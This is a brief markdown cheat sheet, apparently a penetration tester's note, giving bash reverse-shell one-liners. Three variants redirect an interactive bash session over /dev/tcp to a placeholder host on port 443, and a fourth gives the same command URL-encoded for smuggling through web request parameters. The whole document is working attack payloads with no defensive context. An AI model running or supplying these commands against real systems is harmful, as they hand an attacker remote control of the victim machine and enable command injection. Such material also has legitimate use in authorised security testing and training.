# bash reverse shell

## common

```bash
/bin/bash -i >& /dev/tcp/<IP>/443 0>&1
# or
bash -l > /dev/tcp/<IP>/443 0<&1 2>&1
# or
bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"
```

## url encoded

```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F443%200%3E%261%22
```
